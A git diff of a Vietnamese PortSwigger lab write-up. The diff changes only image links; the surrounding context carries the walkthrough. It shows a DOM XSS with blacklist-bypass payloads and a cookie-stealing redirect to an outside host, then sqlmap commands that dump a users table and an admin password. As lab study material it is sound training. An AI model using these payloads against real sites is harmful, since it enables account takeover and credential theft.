@@ -8,7 +8,7 @@ Author: `HoangNCH`
 
 - Sử dụng DOM Invader để inject canary vào form, ta phát hiện được các source và sink như sau:
 
-![image-20211213222734274](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213222734274.png)
+![image-20211213222734274](https://user-images.githubusercontent.com/61876488/146169208-1eb515aa-faf9-4919-9085-d5ada6a2e7e0.png)
 
 - Trong đó có sink chứa hàm `eval` có thể chạy được script js, còn source nằm ở hàm `location.search` sẽ đọc nội dung phần querystring của url hiện tại (`?query=xss2%27"<>`), click vào stack trace để xem sink và source nằm ở đâu trong js code:
 
@@ -39,7 +39,7 @@ function search(path) {
 
 - `window.location.search` có thể lấy data tùy ý mà ta nhập vào từ url parameter `query`, sau đó khi `xhr.send()` thì hàm `xhr.onreadystatechange` sẽ chạy, dẫn đến biến `searchResultsObj` được khởi tạo và được gán bằng response của server khi request `"GET", path + window.location.search` được gửi. Vấn đề là chúng ta chưa biết `path` là gì. Tìm trong HTTP History của Burp Suite ta có:
 
-![image-20211213224603286](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213224603286.png)
+![image-20211213224603286](https://user-images.githubusercontent.com/61876488/146169329-819e5586-94fa-4eed-b0f6-be11cde765f5.png)
 
 - Như vậy `path=="/search"` và  `searchTerm=="xss2'"<>"`, chính là canary mà ta truyền vào. Response ở hình trên ở dạng JSON và do các kí tự truyền vào có `"` nên định dạng JSON bị lỗi, do đó mục `..search results for..` không hiện ra gì. Chúng ta cần phải escape nó.
 
@@ -47,23 +47,23 @@ function search(path) {
 
 - Dùng payload `"+alert(1)}//` để escape JSON.
 
-![image-20211213225524527](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213225524527.png)
+![image-20211213225524527](https://user-images.githubusercontent.com/61876488/146169366-6806c816-fc92-4168-a9b7-2d46d778e568.png)
 
 - Do web app lại blacklist`document.cookie` nên ta chỉ có thể `alert(1)`:
 
-![image-20211213225726052](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213225726052.png)
+![image-20211213225726052](https://user-images.githubusercontent.com/61876488/146169426-e2946d9c-0bb5-4c07-8276-4cbbf917eaa1.png)
 
 - Nhưng ta vẫn có thể bypass bằng cách dùng `document["cookie"]`:
 
-![image-20211213225835470](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213225835470.png)
+![image-20211213225835470](https://user-images.githubusercontent.com/61876488/146169487-b96dde85-3d72-415b-983a-b1346d8b70ad.png)
 
 - Web app còn blacklist cả dấu `.`, vốn hay được dùng trong url. Thử payload `"+alert(' . ')}//`:
 
-![image-20211213230124046](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213230124046.png)
+![image-20211213230124046](https://user-images.githubusercontent.com/61876488/146169515-c176c379-172f-48b5-abbf-ce883c7251fb.png)
 
 - Nhưng chúng ta có thể url encode các dấu chấm thành `%2e` (CVE-2021-41773). Thử payload `"+(location="https://www%2ew3schools%2ecom/?a=1")}//`:
 
-![image-20211213230633913](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213230633913.png)
+![image-20211213230633913](https://user-images.githubusercontent.com/61876488/146169608-19a26787-cde1-4ea3-9d6d-4f881f86396b.png)
 
 ##### 3) Exploit:
 
@@ -77,15 +77,15 @@ location='https://<lab id>.web-security-academy.net/?query=%22%2B%28location%3D%
 
 - Sau khi bấm `deliver exploit to victim` rồi `view exploit` thì vào `access log` kiểm tra:
 
-![image-20211213231136699](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213231136699.png)
+![image-20211213231136699](https://user-images.githubusercontent.com/61876488/146169678-f5827df6-b5a3-4952-a324-75fee4c8e571.png)
 
 - Check access log chúng ta thấy một cookie "lạ", không phải nằm trên client side của chúng ta mà có lẽ là của victim (được highlight bên dưới):
 
-![image-20211213231618624](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213231618624.png)
+![image-20211213231618624](https://user-images.githubusercontent.com/61876488/146169729-99373e9e-3644-4a92-9249-2608900db836.png)
 
 - Copy cookie này rồi thay thế cho cookie hiện tại thì ta chiếm được account `carlos`:
 
-![image-20211213231748164](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213231748164.png)
+![image-20211213231748164](https://user-images.githubusercontent.com/61876488/146169768-44764d26-ca61-41c6-9fc2-c5e99478596f.png)
 
 ### 2) Khai thác SQL Injection tại chức năng "Advanced search": 
 
@@ -94,7 +94,7 @@ location='https://<lab id>.web-security-academy.net/?query=%22%2B%28location%3D%
 - Sau khi login vào thì chúng ta unlock được chức năng "Advanced search":
 - Thử search tại API `GET /advanced_search` với url parameter `sort-by=DATE'`thì server bị lỗi SQL:
 
-![image-20211213233720286](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211213233720286.png)
+![image-20211213233700777](https://user-images.githubusercontent.com/61876488/146169796-d3fef678-23b1-477a-88d8-39081c9ab40a.png)
 
 - Như vậy web app chắc chắn bị SQLi, đồng thời ta biết được database mà nó đang sử dụng là **PostgreSQL**. Thử payload `(case when (1=0) then 2 else 1/0 end)` để comfirm có thể khai thác boolean-based SQLi.
 
@@ -106,11 +106,11 @@ location='https://<lab id>.web-security-academy.net/?query=%22%2B%28location%3D%
 sqlmap -u "https://<lab-id>.web-security-academy.net/advanced_search?query=sql&sort-by=DATE*&BlogArtist=" --cookie="_lab=47%7cMC0CFQCIke9NEAbxqv63GhR%2bSJBXBrPoOgIUW8U8i7A8lWst7ZEjpcYY0yWeY5vTzJLtnakt2%2fXCVQv%2fRHNcmnuzMElPQJ3nNX%2bnY9swdX11KiKAG9ji90bBZHprV07d4B8ImNY0Z4BEe4Lwe73XC9lvDudBWTDbWaVOnqT4f1jVQ9IJ; session=oVXI3YjjITIgfOP1LCsG2fp6zCpZVKOS" --dump
 ```
 
-![image-20211214095628881](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214095628881.png)
+![image-20211213233720286](https://user-images.githubusercontent.com/61876488/146169833-e2bd1f02-c3e3-4a65-92e3-ad0a09598ee2.png)
 
-![image-20211214102141470](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214102141470.png)
+![image-20211214095628881](https://user-images.githubusercontent.com/61876488/146169883-85286f24-35bf-4baa-a63d-546af660baf4.png)
 
-![image-20211214103312460](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214103312460.png)
+![image-20211214102141470](https://user-images.githubusercontent.com/61876488/146169901-54b0bbf4-51e2-4aeb-9458-2c0a89140653.png)
 
 - Sau khi enumerate bằng SQLmap thì có được current database là `public`, có 1 table "khả nghi" là `users`, thử dump table này thì thấy nó có 2 column là `username` và `password`. Do đó tiếp tục dùng lệnh SQLmap sau để dump 2 column kia:
 
@@ -118,7 +118,7 @@ sqlmap -u "https://<lab-id>.web-security-academy.net/advanced_search?query=sql&s
 sqlmap -u "https://<lab-id>.web-security-academy.net/advanced_search?query=sql&sort-by=DATE*&BlogArtist=" --cookie="_lab=47%7cMC0CFQCIke9NEAbxqv63GhR%2bSJBXBrPoOgIUW8U8i7A8lWst7ZEjpcYY0yWeY5vTzJLtnakt2%2fXCVQv%2fRHNcmnuzMElPQJ3nNX%2bnY9swdX11KiKAG9ji90bBZHprV07d4B8ImNY0Z4BEe4Lwe73XC9lvDudBWTDbWaVOnqT4f1jVQ9IJ; session=oVXI3YjjITIgfOP1LCsG2fp6zCpZVKOS" --dump -D public -T users -C username,password
 ```
 
-![image-20211214105324719](C:\Users\antoinenguyen\AppData\Roaming\Typora\typora-user-images\image-20211214105324719.png)
+![image-20211214105324719](https://user-images.githubusercontent.com/61876488/146170101-864359b4-3ba1-4978-802b-ab779924814b.png)
 
 - Lấy được `administrator | cjbnksa6guo0y4a96o04 `, account có role admin do đó chúng ta có thể unlock được chức năng "Admin panel":
 
